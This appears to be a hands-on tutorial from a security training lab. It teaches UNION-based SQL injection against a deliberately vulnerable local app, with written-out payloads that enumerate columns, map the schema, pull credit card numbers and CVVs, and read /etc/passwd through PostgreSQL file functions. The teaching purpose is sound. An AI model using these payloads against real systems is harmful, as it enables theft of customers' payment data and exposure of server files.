# Introduction to SQL Injection

← [Back to Tutorial Index](../README.md#-tutorial-index)

## Overview

This tutorial will guide you through the fundamentals of SQL injection attacks using a hands-on approach. You'll learn how attackers can exploit poorly sanitized database queries to extract sensitive information and escalate their access.

**What you'll learn:**
- How to identify SQL injection vulnerabilities
- Basic and advanced SQL injection techniques
- Data extraction using UNION-based SQL injection

## Getting Started

**Target Application:** All exercises in this tutorial use the vulnerable search functionality.

**Before you begin:**
1. Ensure the application is running at [http://localhost:5000](http://localhost:5000)
2. Navigate to the Search page at [http://localhost:5000/search](http://localhost:5000/search)
3. Login as Alice when prompted

**Important Feature:** After entering any search term, click the blue **View SQL Query** button to see the actual SQL query being executed against the database. This visibility helps you understand how your input is being processed and how the injection works.

---

## 1. Test for SQL injection

> [!NOTE]
> **Key Concept:** SQL injection occurs when user input is directly concatenated into SQL queries without proper sanitization. By injecting a single quote, we can break out of the intended SQL syntax and potentially cause errors that reveal the vulnerability.

1. Login as Alice
2. Go to Status page
3. Enter a single quote (`'`) and look for a database error

## 2. Understand UNION SELECT basics

> [!NOTE]
> **Key Concept:** UNION SELECT is a powerful SQL technique that allows attackers to retrieve data from other tables by combining the results of two SELECT queries. This is the foundation for most SQL injection data exfiltration attacks.

**What is UNION SELECT?**
- UNION SELECT allows you to combine results from two SELECT statements
- It's like running two queries at once across different tables
- Both queries must return the same number of columns
- Column data types must be compatible

**Example of a failed UNION attempt:**
- Query: `' UNION SELECT * FROM feedback --`
- This fails because the column count doesn't match between tables

## 3. Determine the number of columns

> [!NOTE]
> **Key Concept:** For UNION SELECT to work, both queries must return the same number of columns. The ORDER BY clause can be used to enumerate columns because it references columns by their position. When you ORDER BY a column number that doesn't exist, the database throws an error.

1. Login as Alice (if not already logged in)
2. Go to Status page
3. Use `ORDER BY` to find the column count
4. Enter: `' ORDER BY 1 --`
5. Keep incrementing the number until you get an error: `' ORDER BY 2 --`, `' ORDER BY 3 --`, etc.
6. When you find the number that causes an error, the column count is one less than that number

## 4. Craft a working UNION SELECT query

> [!NOTE]
> **Key Concept:** Once you know the column count, you need to match data types between the original query and your injected UNION SELECT. Using placeholder values helps identify which columns are displayed and what data types they accept (integers, strings, timestamps, etc.).

1. Now that you know the column count (8 columns), create placeholder values
2. Enter: `' UNION SELECT 111,222,333,444,555,666,777,888 --`
3. Observe which columns are displayed in the results
4. Match the data types for each column
5. Enter: `' UNION SELECT 111,222,'333','444',555,'666','777',CURRENT_TIMESTAMP --`

## 5. Discover database schema

> [!NOTE]
> **Key Concept:** Database metadata is stored in special system tables like `information_schema`. By querying these tables through SQL injection, attackers can map out the entire database structure, discovering table names, column names, and data types - essentially getting a blueprint of all available data.

1. List all tables in the database using `information_schema.tables`
2. Enter: `' UNION SELECT 1111,222,table_name,'444',555,'666','777',CURRENT_TIMESTAMP FROM information_schema.tables ORDER BY ID DESC --`
3. Look for interesting tables (e.g., `billing_information`, `users`, etc.)
4. Get column names and data types from the `billing_information` table
5. Enter: `' UNION SELECT 111,222,column_name,data_type,555,'666','777',CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name = 'billing_information' ORDER BY id DESC --`

## 6. Extract sensitive data (PII)

> [!NOTE]
> **Key Concept:** With knowledge of the database schema, attackers can target specific tables and columns containing sensitive information. This demonstrates the real-world impact of SQL injection - unauthorized access to personally identifiable information (PII) and financial data.

1. Use the column information discovered to extract customer data
2. Target credit card numbers, expiry dates, CVV, and names
3. Enter: `' UNION SELECT 111,222,credit_card_number,credit_card_expiry,555,credit_card_cvv,full_name,CURRENT_TIMESTAMP FROM billing_information ORDER BY id DESC --`
4. Review the extracted payment information

## 7. Gather database information

> [!NOTE]
> **Key Concept:** PostgreSQL provides built-in functions that reveal system information. The `version()` function exposes the database version and underlying operating system details, which helps attackers identify potential vulnerabilities specific to that version.

1. Use PostgreSQL functions to get database version
2. Enter: `' UNION SELECT 111,222, version(), '444',555,'666','777',CURRENT_TIMESTAMP ORDER BY ID DESC --`
3. Note the PostgreSQL version and system information

## 8. List directories and read system files

> [!NOTE]
> **Key Concept:** PostgreSQL's administrative functions like `pg_ls_dir()` and `pg_read_file()` can be abused through SQL injection to access the server's filesystem. This escalates the attack beyond just database access to potentially reading sensitive system configuration files.

1. Use PostgreSQL's `pg_ls_dir()` function to list directories
2. Enter: `' UNION SELECT 1111,2222,pg_ls_dir('/etc/'),'4444',5555,'6666','7777',CURRENT_TIMESTAMP ORDER BY ID DESC --`
3. View sensitive files like `/etc/passwd` using `pg_read_file()`
4. Enter: `' UNION SELECT 1111,2222,pg_read_file('/etc/passwd'),'4444',5555,'6666','7777',CURRENT_TIMESTAMP ORDER BY ID DESC --`

---

## Next Steps

**Congratulations!** You've completed the Introduction to SQL Injection tutorial.

**Continue your learning:**
- **Next Tutorial:** [2. Blind SQL Injection](./2.%20BLIND%20SQL%20INJECTION.md) - Learn to extract data without seeing query results
- **Advanced Techniques:** [3. Advanced Techniques](./3.%20ADVANCED%20TECHNIQUES.md) - Escalate to full system compromise

← [Back to Tutorial Index](../README.md#-tutorial-index)

